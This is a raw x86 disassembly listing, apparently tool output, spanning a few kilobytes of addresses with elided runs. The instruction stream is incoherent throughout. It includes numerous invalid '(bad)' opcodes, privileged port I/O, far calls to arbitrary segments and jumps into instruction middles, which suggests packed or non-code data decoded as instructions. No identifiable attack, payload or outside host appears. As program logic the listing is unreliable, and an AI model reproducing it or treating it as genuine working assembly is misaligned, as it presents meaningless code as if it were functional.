  41c86b:	mov    ebp,DWORD PTR [esi+esi*4-0x4c62b82e]
  41c872:	inc    ebp
  41c873:	mov    WORD PTR [esi-0xa3ddce7],gs
  41c879:	rol    BYTE PTR [esi+0xe3b42a5],0x32
  41c880:	into   
  41c881:	xor    eax,0x76710683
  41c886:	outs   dx,BYTE PTR ds:[esi]
  41c887:	pop    edi
  41c888:	ins    BYTE PTR es:[edi],dx
  41c889:	mov    esi,0x24f120d9
  41c88e:	fmul   DWORD PTR [ecx+0x46]
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	sbb    al,0x32
  41c902:	xor    al,0xa9
  41c904:	test   al,0x2f
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xb7000001
  41c90d:	xchg   ecx,eax
  41c90e:	(bad)  
  41c90f:	test   al,0x4a
  41c911:	mov    esp,0xaa5d010a
  41c916:	test   al,0x59
  41c918:	mov    bh,BYTE PTR [esi-0x8521d6a]
  41c91e:	inc    ecx
  41c91f:	aaa    
  41c920:	add    esp,ebp
  41c922:	outs   dx,DWORD PTR ds:[esi]
  41c923:	nop
  41c924:	test   BYTE PTR ds:0x3bd7724,al
  41c92a:	or     DWORD PTR [esi],eax
  41c92c:	dec    ebx
  41c92d:	jbe    0x41c982
  41c92f:	cmovbe esp,DWORD PTR [edx+0x7a04b86c]
  41c936:	or     DWORD PTR [ebx+0x4a],ecx
  41c939:	fs pop edi
  41c93b:	repnz ins BYTE PTR es:[edi],dx
  41c93d:	mov    bl,0xec
  41c93f:	std    
  41c940:	je     0x41c8e5
  41c942:	(bad)  
  41c943:	or     eax,DWORD PTR [ebx+0x69]
  41c946:	dec    edx
  41c947:	sbb    eax,0xb52ba84f
  41c94c:	fcmovnb st,st(3)
  41c94e:	xchg   ecx,eax
  41c94f:	add    ch,al
  41c951:	mov    ds:0xfff575e1,eax
  41c956:	push   esp
  41c957:	repz pop edx
  41c959:	and    BYTE PTR [edi+esi*4-0x75],bl
  41c95d:	jbe    0x41c8f1
  41c95f:	xchg   DWORD PTR [eax-0x77281ab8],ecx
  41c965:	pop    esp
  41c966:	enter  0x7b64,0x55
  41c96a:	jno    0x41c9a4
  41c96c:	rcl    DWORD PTR [ebp+0x3ed7a602],cl
  41c972:	pop    edx
  41c973:	mov    ch,0xf2
  41c975:	out    0x45,al
  41c977:	jp     0x41c937
  41c979:	aam    0x73
  41c97b:	stos   BYTE PTR es:[edi],al
  41c97c:	mov    esi,0xdf65b55b
  41c981:	mov    BYTE PTR [eax-0x7b],0x90
  41c985:	sub    DWORD PTR [esp+eax*4-0x31],eax
  41c989:	test   BYTE PTR [esi-0x31bce9c6],cl
  41c98f:	call   0xfaec9735
  41c994:	jmp    0x41c963
  41c996:	popa   
  41c997:	pop    esp
  41c998:	bound  esp,QWORD PTR [edx]
  41c99a:	add    ecx,DWORD PTR [eax+0x56]
  41c99d:	mov    ebp,0x2071c5c3
  41c9a2:	outs   dx,DWORD PTR ds:[esi]
  41c9a3:	inc    ebp
  41c9a4:	xor    DWORD PTR [ecx+eiz*8+0x35],edx
  41c9a8:	and    eax,0x30debc2a
  41c9ad:	inc    eax
  41c9ae:	mov    fs,WORD PTR [ebx+0xfdccb1]
  41c9b4:	dec    eax
  41c9b5:	popa   
  41c9b6:	and    BYTE PTR [edx-0x53a4db8b],0xc3
  41c9bd:	jge    0x41c9b1
  41c9bf:	popf   
  41c9c0:	fimul  DWORD PTR [ecx+0x79]
  41c9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9c4:	fmul   QWORD PTR [esi+0x1d]
  41c9c7:	aas    
  41c9c8:	rcl    esi,1
  41c9ca:	(bad)  
  41c9cb:	xor    eax,0x897b4102
  41c9d0:	pop    esp
  41c9d1:	out    0x1d,al
  41c9d3:	scas   eax,DWORD PTR es:[edi]
  41c9d4:	std    
  41c9d5:	dec    ebx
  41c9d6:	or     BYTE PTR [ecx+0x6d],ch
  41c9d9:	outs   dx,BYTE PTR ds:[esi]
  41c9da:	retf   0x3117
  41c9dd:	pushfw 
  41c9df:	xchg   edi,eax
  41c9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e1:	cmp    al,0x1d
  41c9e3:	push   0xa865ad2b
  41c9e8:	adc    bl,ah
  41c9ea:	imul   ebp,DWORD PTR [edx],0xffffffb3
  41c9ed:	pop    es
  41c9ee:	and    ecx,edx
  41c9f0:	leave  
  41c9f1:	mov    dl,0x36
  41c9f3:	and    ecx,ecx
  41c9f5:	jo     0x41c9e0
  41c9f7:	cmp    eax,0x3b7d5eb6
  41c9fc:	jecxz  0x41c9ff
  41c9fe:	in     eax,0xb2
  41ca00:	or     al,0xd1
  41ca02:	stos   DWORD PTR es:[edi],eax
  41ca03:	push   ecx
  41ca04:	cmp    bh,BYTE PTR [edx-0x7c93db62]
  41ca0a:	or     BYTE PTR [ebx-0x69],cl
  41ca0d:	mov    DWORD PTR [ecx],ebp
  41ca0f:	push   edx
  41ca10:	dec    edi
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	or     al,0xf0
  41ca82:	xchg   di,ax
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0x55000001,al
  41ca8d:	pop    ebx
  41ca8e:	or     bl,BYTE PTR [ecx+0x6ec9086b]
  41ca94:	jo     0x41ca79
  41ca96:	(bad)  
  41ca97:	fidivr WORD PTR [ebx-0x5d]
  41ca9a:	loope  0x41ca9c
  41ca9c:	inc    esi
  41ca9d:	inc    esi
  41ca9e:	jne    0x41ca4d
  41caa0:	sub    esp,DWORD PTR [esi+0x558217f5]
  41caa6:	add    BYTE PTR [ebx-0x7ae27a97],cl
  41caac:	mov    bh,0x1b
  41caae:	jns    0x41ca8f
  41cab0:	push   edi
  41cab1:	shr    DWORD PTR [ebp-0x2fef365e],cl
  41cab7:	clc    
  41cab8:	pop    ebx
  41cab9:	popa   
  41caba:	jnp    0x41ca67
  41cabc:	adc    al,0x12
  41cabe:	aaa    
  41cabf:	or     ecx,DWORD PTR [edi-0x1b]
  41cac2:	jmp    0x41cb34
  41cac4:	ins    DWORD PTR es:[edi],dx
  41cac5:	adc    DWORD PTR [ebx+ecx*4],0xffffffb6
  41cac9:	mov    ebx,0xb728f64c
  41cace:	dec    esp
  41cacf:	(bad)
  41cad2:	in     eax,0x68
  41cad4:	jp     0x41cafd
  41cad6:	leave  
  41cad7:	and    bh,BYTE PTR [eax-0x2e]
  41cada:	adc    dh,BYTE PTR [ebx-0x1f7a1436]
  41cae0:	and    bh,cl
  41cae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae3:	cs int3 
  41cae5:	ret    0xe553
  41cae8:	test   DWORD PTR [ecx+0x1a],0x87860d53
  41caef:	mov    esi,0xe6ef2b5f
  41caf4:	bound  edx,QWORD PTR cs:[ebp+0x3d]
  41caf8:	xchg   esp,eax
  41caf9:	cli    
  41cafa:	inc    edi
  41cafb:	loopne 0x41cad4
  41cafd:	js     0x41cab8
  41caff:	add    DWORD PTR [edx-0x57],eax
  41cb02:	std    
  41cb03:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41cb05:	xchg   esi,eax
  41cb06:	jae    0x41ca8e
  41cb08:	mov    edi,0xbcd942fb
  41cb0d:	xor    cl,dh
  41cb0f:	out    0x74,eax
  41cb11:	jnp    0x41cb92
  41cb13:	add    DWORD PTR [ecx+0x69],edi
  41cb16:	and    ebx,DWORD PTR [edi+eiz*1]
  41cb19:	fsubr  QWORD PTR [di+0x46]
  41cb1d:	cmp    dl,BYTE PTR [esi+ebx*1-0x47951217]
  41cb24:	inc    esp
  41cb25:	sub    edx,DWORD PTR [esp+edx*1]
  41cb28:	and    cl,BYTE PTR [ebp+0x13048f98]
  41cb2e:	sub    edi,eax
  41cb30:	adc    eax,0xc434eac4
  41cb35:	xchg   BYTE PTR [ebx],ch
  41cb37:	out    dx,eax
  41cb38:	in     al,dx
  41cb39:	jnp    0x41cb80
  41cb3b:	pop    es
  41cb3c:	jmp    0x929a:0xb0457766
  41cb43:	lds    esi,FWORD PTR [ecx]
  41cb45:	lahf   
  41cb46:	aas    
  41cb47:	push   esi
  41cb48:	aam    0x79
  41cb4a:	cmp    al,0x4f
  41cb4c:	cld    
  41cb4d:	nop
  41cb4e:	add    ch,dh
  41cb50:	push   eax
  41cb51:	ret    0x52fd
  41cb54:	ins    BYTE PTR es:[edi],dx
  41cb55:	rol    DWORD PTR [edx+0x451d0329],cl
  41cb5b:	mov    bh,BYTE PTR [edx]
  41cb5d:	fdiv   QWORD PTR [edi+0x30b949be]
  41cb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb64:	out    dx,eax
  41cb65:	pop    eax
  41cb66:	test   al,0x94
  41cb68:	je     0x41cb48
  41cb6a:	dec    edx
  41cb6b:	jo     0x41cb62
  41cb6d:	fs popf 
  41cb6f:	push   ss
  41cb70:	pop    es
  41cb71:	test   BYTE PTR [ebx+ebp*4],bl
  41cb74:	pop    ebp
  41cb75:	jp     0x41cbb1
  41cb77:	jge    0x41cafd
  41cb79:	pop    edi
  41cb7a:	inc    ebp
  41cb7b:	sub    al,0xf0
  41cb7d:	sub    DWORD PTR [edi+0x29],edx
  41cb80:	mov    esp,0x8f754cfe
  41cb85:	test   ecx,esi
  41cb87:	fisttp WORD PTR [ecx-0x9f3fee9]
  41cb8d:	pushf  
  41cb8e:	ja     0x41cbb7
  41cb90:	rol    DWORD PTR [eax],1
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x77624622
  41cc03:	shl    DWORD PTR [edx+0x5000131],cl
  41cc09:	add    DWORD PTR [eax],eax
  41cc0b:	add    BYTE PTR [ecx],ah
  41cc0d:	jno    0x41cbea
  41cc0f:	jecxz  0x41cbf2
  41cc11:	jbe    0x41cbcd
  41cc13:	pushf  
  41cc14:	mov    esi,0x92819a5b
  41cc19:	jne    0x41cbe9
  41cc1b:	gs push edi
  41cc1d:	inc    eax
  41cc1e:	add    al,0x1f
  41cc20:	jecxz  0x41cbaf
  41cc22:	stos   DWORD PTR es:[edi],eax
  41cc23:	jl     0x220adb1d
  41cc29:	add    dh,al
  41cc2b:	sub    al,0x72
  41cc2d:	imul   eax,DWORD PTR [ebx-0x371c2963],0x3f
  41cc34:	test   BYTE PTR [edi+0x23],bh
  41cc37:	jp     0x41cc72
  41cc39:	fisub  WORD PTR [ecx-0x5f3b9fd7]
  41cc3f:	jecxz  0x41cc24
  41cc41:	xchg   ebp,eax
  41cc42:	jb     0x41cbe4
  41cc44:	(bad)  
  41cc45:	cmp    dh,BYTE PTR [esi+0x545a7de3]
  41cc4b:	lea    edx,[ecx-0x4d]
  41cc4e:	pop    ebp
  41cc4f:	cmp    DWORD PTR [eax],ebp
  41cc51:	loop   0x41cc25
  41cc53:	xchg   esp,eax
  41cc54:	adc    ebp,DWORD PTR [eax]
  41cc56:	les    edi,FWORD PTR [eax-0x1d]
  41cc59:	(bad)  [ebp-0x4a544e9a]
  41cc5f:	call   0xe91d384d
  41cc64:	and    al,0xcd
  41cc66:	aad    0x6b
  41cc68:	jmp    0x7160:0x5bc2de3e
  41cc6f:	shr    eax,0xd9
  41cc72:	fs jg  0x41ccee
  41cc75:	or     eax,0xeea94e73
  41cc7a:	jno    0x41cc9c
  41cc7c:	inc    ebp
  41cc7d:	addr16 stc 
  41cc7f:	hlt    
  41cc80:	sbb    BYTE PTR [ecx-0x2a0ad875],al
  41cc86:	sbb    eax,esp
  41cc88:	and    eax,0x74b41b22
  41cc8d:	xchg   ecx,eax
  41cc8e:	sbb    dl,BYTE PTR [ebp-0x5e]
  41cc91:	(bad)  
  41cc92:	out    0xcc,al
  41cc94:	mov    al,0x74
  41cc96:	add    al,0x8a
  41cc98:	adc    bl,bl
  41cc9a:	dec    esp
  41cc9b:	cmp    DWORD PTR [edx],ebp
  41cc9d:	imul   edi,DWORD PTR [eax],0x95a0c435
  41cca3:	ror    DWORD PTR [esi+0x79],cl
  41cca6:	and    DWORD PTR [edx],esp
  41cca8:	sub    bh,BYTE PTR ds:0xb37916c5
  41ccae:	nop
  41ccaf:	mov    ecx,0x12e9f1af
  41ccb4:	dec    esp
  41ccb5:	pop    esi
  41ccb6:	and    DWORD PTR [edi+0x63cd87c4],0x1d1ace1
  41ccc0:	mov    ch,0x23
  41ccc2:	or     dh,BYTE PTR [esi+0x23]
  41ccc5:	push   ecx
  41ccc6:	xor    eax,DWORD PTR [edi]
  41ccc8:	lods   al,BYTE PTR ds:[esi]
  41ccc9:	nop
  41ccca:	xchg   ebp,eax
  41cccb:	push   es
  41cccc:	cdq    
  41cccd:	fist   WORD PTR [ecx+0x7a]
  41ccd0:	pop    ds
  41ccd1:	or     DWORD PTR [edi-0x6cb47ae7],ebp
  41ccd7:	repz sub DWORD PTR [eax],eax
  41ccda:	add    esp,eax
  41ccdc:	mov    edx,0xef11bdf2
  41cce1:	retf   
  41cce2:	call   0x7f57:0x13e8ad3f
  41cce9:	cdq    
  41ccea:	jl     0x41cc84
  41ccec:	jo     0x41cd24
  41ccee:	stos   BYTE PTR es:[edi],al
  41ccef:	ret    0x107b
  41ccf2:	das    
  41ccf3:	in     eax,dx
  41ccf4:	pop    eax
  41ccf5:	sbb    eax,0x9f5e3466
  41ccfa:	add    BYTE PTR [esi],cl
  41ccfc:	scas   al,BYTE PTR es:[edi]
  41ccfd:	inc    edx
  41ccfe:	dec    ebx
  41ccff:	(bad)  
  41cd00:	push   edx
  41cd01:	mov    ecx,DWORD PTR [edx+0x2794ff97]
  41cd07:	mov    bh,0x9
  41cd09:	jmp    0x80fbe822
  41cd0e:	out    0xe7,al
  41cd10:	inc    ebx
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	sbb    DWORD PTR [edx],esi
  41cd82:	mov    ebp,0x132b744
  41cd87:	add    BYTE PTR ds:0xb7000001,al
  41cd8d:	cmp    edi,DWORD PTR [eax-0x21]
  41cd90:	loop   0x41cdb1
  41cd92:	jge    0x41cdd3
  41cd94:	jbe    0x41cda1
  41cd96:	retf   
  41cd97:	test   DWORD PTR [ecx-0x6c],0x930384f9
  41cd9e:	stc    
  41cd9f:	cmp    esp,esp
  41cda1:	mov    edx,eax
  41cda3:	sbb    eax,0x2dce797b
  41cda8:	jge    0x41cdef
  41cdaa:	out    dx,al
  41cdab:	sub    esp,edx
  41cdad:	inc    ebp
  41cdae:	mov    al,ds:0xdedfe077
  41cdb3:	js     0x41ce12
  41cdb5:	fiadd  WORD PTR [ebp+0xe]
  41cdb8:	sub    esi,DWORD PTR [edx-0x49]
  41cdbb:	loope  0x41cddc
  41cdbd:	in     al,dx
  41cdbe:	or     BYTE PTR [edi],0x15
  41cdc1:	out    0x70,al
  41cdc3:	xor    bh,BYTE PTR [ebx+0x7da42a17]
  41cdc9:	xchg   ecx,edi
  41cdcb:	jmp    FWORD PTR [ebp-0x70]
  41cdce:	ins    BYTE PTR es:[edi],dx
  41cdcf:	dec    eax
  41cdd0:	xlat   BYTE PTR ds:[ebx]
  41cdd1:	shrd   DWORD PTR [edx+ecx*8],ebp,0xfd
  41cdd6:	sbb    edi,eax
  41cdd8:	mov    edx,0xe11f62aa
  41cddd:	sub    eax,0xe7877f88
  41cde2:	and    al,cl
  41cde4:	push   0x64
  41cde6:	mov    ebx,0xcfe51331
  41cdeb:	dec    ebx
  41cdec:	xchg   esi,eax
  41cded:	les    edx,FWORD PTR [ecx-0x3b9d80b0]
  41cdf3:	loope  0x41ce55
  41cdf5:	retf   
  41cdf6:	mov    eax,0x70cd9c04
  41cdfb:	dec    ebx
  41cdfc:	pushf  
  41cdfd:	in     eax,dx
  41cdfe:	cli    
  41cdff:	mov    ds:0x3ea5550b,al
  41ce04:	mov    cl,0x2c
  41ce06:	(bad)  
  41ce07:	mov    ebp,0xd404ab1a
  41ce0c:	test   BYTE PTR [esp+edi*8],0x5a
  41ce10:	xor    al,BYTE PTR [ecx-0x39]
  41ce13:	cmp    al,0xc6
  41ce15:	adc    edx,DWORD PTR [ebx]
  41ce17:	lods   al,BYTE PTR ds:[esi]
  41ce18:	pop    es
  41ce19:	leave  
  41ce1a:	xor    eax,DWORD PTR [edx]
  41ce1c:	xchg   DWORD PTR [ebx],ebx
  41ce1e:	and    dl,dl
  41ce20:	or     cl,BYTE PTR [ebp-0x12]
  41ce23:	push   ds
  41ce24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce25:	adc    eax,0x97339a3c
  41ce2a:	sbb    al,0x12
  41ce2c:	push   edi
  41ce2d:	sub    al,0xf2
  41ce2f:	dec    edi
  41ce30:	aad    0x94
  41ce32:	or     eax,0xf773181f
  41ce37:	test   DWORD PTR [esi],esp
  41ce39:	jbe    0x41ce52
  41ce3b:	mov    cl,0x1c
  41ce3d:	adc    al,0xb4
  41ce3f:	xchg   edi,eax
  41ce40:	or     eax,0xc5d0566a
  41ce45:	enter  0xb362,0xc2
  41ce49:	int    0x9a
  41ce4b:	lods   eax,DWORD PTR ds:[esi]
  41ce4c:	sub    edx,ebp
  41ce4e:	div    DWORD PTR [edx-0x21651736]
  41ce54:	repz int3 
  41ce56:	imul   esp,DWORD PTR [edx],0xffffff8d
  41ce59:	push   ecx
  41ce5a:	loop   0x41ce5c
  41ce5c:	stc    
  41ce5d:	cdq    
  41ce5e:	and    ecx,DWORD PTR [ebx-0x7e]
  41ce61:	jecxz  0x41ce91
  41ce63:	scas   eax,DWORD PTR es:[edi]
  41ce64:	out    0xd6,eax
  41ce66:	pop    ecx
  41ce67:	shl    DWORD PTR [ebx],1
  41ce69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6a:	hlt    
  41ce6b:	mov    bh,0xf2
  41ce6d:	stos   DWORD PTR es:[edi],eax
  41ce6e:	rol    BYTE PTR [edx+0x51675168],0xba
  41ce75:	(bad)  
  41ce77:	sub    eax,0x788f2e7c
  41ce7c:	or     DWORD PTR [esi],edi
  41ce7e:	shl    BYTE PTR [ebx],1
  41ce80:	inc    eax
  41ce81:	add    ch,cl
  41ce83:	sub    BYTE PTR [edx+edi*1-0x7281d0a9],dh
  41ce8a:	sub    bl,BYTE PTR [edi-0x7b033b36]
  41ce90:	add    BYTE PTR cs:[eax],al
	...
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	in     al,0x7c
  41cf02:	sbb    DWORD PTR [esp+edi*4],esp
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0x2f000001,al
  41cf0d:	mov    al,0xe9
  41cf0f:	push   ebp
  41cf10:	and    eax,0x1a6f69e0
  41cf15:	les    ebp,FWORD PTR [edi+0x305bd0cf]
  41cf1b:	adc    BYTE PTR [edx],cl
  41cf1d:	jge    0x41cf43
  41cf1f:	int3   
  41cf20:	test   al,0x1d
  41cf22:	out    dx,eax
  41cf23:	call   0xf2e6:0xbe5e2818
  41cf2a:	fldl2t 
  41cf2c:	mov    dh,0x9d
  41cf2e:	mov    edx,DWORD PTR [ebp-0x49]
  41cf31:	call   0x715f8d23
  41cf36:	xor    BYTE PTR [edi+ecx*8+0x4],0x78
  41cf3b:	adc    eax,DWORD PTR [esp+eax*1]
  41cf3e:	jns    0x41cf23
  41cf40:	mov    ebx,0x84c81307
  41cf45:	cmp    DWORD PTR [ebx-0x65],esi
  41cf48:	es (bad) 
  41cf4a:	mov    ds:0x755e9c5a,eax
  41cf4f:	clc    
  41cf50:	add    eax,0x2df642bd
  41cf55:	jae    0x41cf95
  41cf57:	and    al,0xfb
  41cf59:	xchg   esp,eax
  41cf5a:	inc    esp
  41cf5b:	in     eax,0xdd
  41cf5d:	inc    edi
  41cf5e:	mov    ecx,0x7e424eed
  41cf63:	imul   DWORD PTR [ebp+0x5da58fa9]
  41cf69:	xchg   esi,eax
  41cf6a:	aaa    
  41cf6b:	in     eax,dx
  41cf6c:	cmc    
  41cf6d:	mov    DWORD PTR [ecx+0x42],ebp
  41cf70:	mul    DWORD PTR [ecx]
  41cf72:	adc    DWORD PTR ds:0x5ee4ac44,ebp
  41cf78:	cmp    esi,0xf0cbab77
  41cf7e:	imul   bl
  41cf80:	cmp    eax,0x2ebdb3ff
  41cf85:	std    
  41cf86:	or     edx,DWORD PTR [ebx+0x4df37542]
  41cf8c:	stos   BYTE PTR es:[edi],al
  41cf8d:	ret    
  41cf8e:	xor    eax,0xbdcf3108
  41cf93:	mov    ebx,0x8ac60317
  41cf98:	mov    edx,0xed1e6bb1
  41cf9d:	data16 (bad) 
  41cf9f:	fstp   st(6)
  41cfa1:	push   0xffffffc1
  41cfa3:	mov    ecx,DWORD PTR [edi-0x1c]
  41cfa6:	cdq    
  41cfa7:	adc    eax,0x4920e492
  41cfac:	pop    edi
  41cfad:	inc    ecx
  41cfae:	cmp    ah,BYTE PTR [edx+0x1b]
  41cfb1:	pop    eax
  41cfb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb3:	inc    esi
  41cfb4:	mov    ds:0x183dbedd,eax
  41cfb9:	pop    es
  41cfba:	jl     0x41d012
  41cfbc:	and    ebp,DWORD PTR [esi-0x3bad75f6]
  41cfc2:	lahf   
  41cfc3:	mov    edx,es
  41cfc5:	neg    BYTE PTR [edi+edx*8+0x31]
  41cfc9:	sbb    ebp,eax
  41cfcb:	push   ebp
  41cfcc:	ret    0xbc3b
  41cfcf:	and    DWORD PTR [edi],esi
  41cfd1:	out    dx,eax
  41cfd2:	ror    edi,1
  41cfd4:	aaa    
  41cfd5:	in     al,dx
  41cfd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd7:	fldcw  WORD PTR [edx]
  41cfd9:	dec    ebx
  41cfda:	out    0xfa,al
  41cfdc:	cli    
  41cfdd:	jnp    0x41d01d
  41cfdf:	push   ebx
  41cfe0:	repnz fcomp DWORD PTR [esi+0x172bbad4]
  41cfe7:	jmp    0x936d6dd
  41cfec:	xor    bh,al
  41cfee:	call   0xfab7:0xf71f074e
  41cff5:	popa   
  41cff6:	cmp    ch,BYTE PTR [ebx-0x6d]
  41cff9:	cli    
  41cffa:	js     0x41d002
  41cffc:	mov    al,0x17
  41cffe:	das    
  41cfff:	fst    QWORD PTR [edi]
  41d001:	dec    esp
  41d002:	fmul   DWORD PTR [edi]
  41d004:	sbb    eax,DWORD PTR [ebx]
  41d006:	add    al,0x7
  41d008:	push   0x58
  41d00a:	pop    esp
  41d00b:	in     eax,0xb5
  41d00d:	jne    0x41d085
  41d00f:	push   esi
  41d010:	loop   0x41d012
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xabd1e1bd
  41d083:	push   ss
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0xbe000001
  41d08d:	ss jle 0x41d04b
  41d090:	fucom  st(0)
  41d092:	push   cs
  41d093:	retf   0xbcbd
  41d096:	std    
  41d097:	js     0x41d037
  41d099:	icebp  
  41d09a:	cld    
  41d09b:	mov    eax,DWORD PTR [edx]
  41d09d:	fstp   TBYTE PTR [ecx]
  41d09f:	cmc    
  41d0a0:	jne    0x41d0ef
  41d0a2:	cmp    esp,eax
  41d0a4:	inc    ecx
  41d0a5:	fcomp  QWORD PTR [eax-0x5fa8810d]
  41d0ab:	push   ss
  41d0ac:	(bad)  
  41d0ae:	or     DWORD PTR [edx+0xa],ecx
  41d0b1:	xor    edx,DWORD PTR [eax-0x3]
  41d0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0b5:	mov    ah,0x39
  41d0b7:	mov    ebp,0x287c496f
  41d0bc:	cdq    
  41d0bd:	pop    ebx
  41d0be:	popf   
  41d0bf:	sub    al,0x8b
  41d0c1:	or     eax,0xe67d0b0b
  41d0c6:	sar    DWORD PTR [edx-0x7b],cl
  41d0c9:	cld    
  41d0ca:	jg     0x41d10d
  41d0cc:	arpl   si,bx
  41d0ce:	mov    ecx,ecx
  41d0d0:	sbb    BYTE PTR [edi],ah
  41d0d2:	ss jp  0x41d0f4
  41d0d5:	test   DWORD PTR [esi-0x47],0xb622403e
  41d0dc:	loope  0x41d08c
  41d0de:	pop    es
  41d0df:	call   0x1075:0x3ba999b2
  41d0e6:	mov    dl,0xad
  41d0e8:	cmp    cl,BYTE PTR [edx]
  41d0ea:	and    ah,BYTE PTR [edi+0xe]
  41d0ed:	sub    cl,BYTE PTR [esi]
  41d0ef:	rol    al,0x1d
  41d0f2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f4:	loopne 0x41d172
  41d0f6:	push   ebx
  41d0f7:	mov    edi,0xc476766e
  41d0fc:	xchg   eax,ecx
  41d0fe:	or     DWORD PTR [ebp+0x26],0x76
  41d102:	cdq    
  41d103:	push   0xffffffc1
  41d105:	inc    cx
  41d107:	xchg   BYTE PTR [eax+0x27d91b5],bh
  41d10d:	out    0xa6,eax
  41d10f:	push   0xffffffed
  41d111:	or     DWORD PTR [ecx+0x4a],ecx
  41d114:	adc    al,ch
  41d116:	jnp    0x41d0e2
  41d118:	push   0xaf05f959
  41d11d:	cmp    dl,dl
  41d11f:	inc    esi
  41d120:	test   eax,0xb9346a66
  41d125:	mov    ds:0x58029111,eax
  41d12a:	cmc    
  41d12b:	test   al,0xd9
  41d12d:	push   0x3c4d063c
  41d132:	stos   DWORD PTR es:[edi],eax
  41d133:	div    DWORD PTR [esi-0x47]
  41d136:	scas   al,BYTE PTR es:[edi]
  41d137:	pop    eax
  41d138:	lods   al,BYTE PTR ds:[esi]
  41d139:	jno    0x41d0da
  41d13b:	jmp    0x41d116
  41d13d:	and    BYTE PTR [ebx-0x6],al
  41d140:	out    0x41,al
  41d142:	repnz sub edx,ecx
  41d145:	call   0x96ec:0x36b6b746
  41d14c:	sbb    DWORD PTR [ebx-0x2540e25f],ebp
  41d152:	hlt    
  41d153:	cs jns 0x41d16e
  41d156:	cmp    ebp,0x3d
  41d159:	jg     0x41d1d4
  41d15b:	dec    edx
  41d15c:	je     0x41d18d
  41d15e:	add    eax,0x923bf2cb
  41d163:	mov    al,0xa6
  41d165:	jae    0x41d158
  41d167:	fdiv   QWORD PTR [esi+edi*1]
  41d16a:	mov    ch,0xde
  41d16c:	mov    DWORD PTR gs:[edx-0x3d0b08be],0xce00d818
  41d177:	loope  0x41d1d4
  41d179:	nop
  41d17a:	lods   eax,DWORD PTR ds:[esi]
  41d17b:	adc    eax,0x4b496f1d
  41d180:	nop
  41d181:	sbb    BYTE PTR [ebx+edi*8+0xa180472],bl
  41d188:	push   ds
  41d189:	inc    ebx
  41d18a:	fiadd  WORD PTR [ebp-0x3d]
  41d18d:	sub    DWORD PTR [edx+0xf000],esp
	...
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	out    0xdc,eax
  41d202:	dec    esi
  41d203:	push   ds
  41d204:	(bad)  
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	hlt    
  41d20d:	add    al,0xe7
  41d20f:	mov    DWORD PTR [esi+0x2f],ebp
  41d212:	sub    ch,BYTE PTR [ebp+0x5f]
  41d215:	aas    
  41d216:	adc    eax,0x133f1093
  41d21b:	test   BYTE PTR [esi],bh
  41d21d:	mov    bl,0xd0
  41d21f:	mov    ebx,0x49587c33
  41d224:	jae    0x41d210
  41d226:	mov    DWORD PTR [edx-0x28],esi
  41d229:	sbb    ah,al
  41d22b:	aam    0x45
  41d22d:	sbb    al,0xa1
  41d22f:	dec    esi
  41d230:	ror    DWORD PTR [esi-0x7f58fca5],1
  41d236:	jl     0x41d1f3
  41d238:	xchg   ecx,eax
  41d239:	xlat   BYTE PTR ds:[ebx]
  41d23a:	push   ebp
  41d23b:	shr    ch,cl
  41d23d:	scas   al,BYTE PTR es:[edi]
  41d23e:	adc    al,0xee
  41d240:	mov    cl,0xc3
  41d242:	mov    ss,WORD PTR [ebp*8+0x5714b604]
  41d249:	fst    QWORD PTR ds:0x3c123178
  41d24f:	cld    
  41d250:	push   cs
  41d251:	add    eax,0xec63f092
  41d256:	mov    ds:0x9ba79b32,al
  41d25b:	mov    edi,0xee903f30
  41d260:	xchg   ecx,eax
  41d261:	dec    ebx
  41d262:	scas   al,BYTE PTR es:[edi]
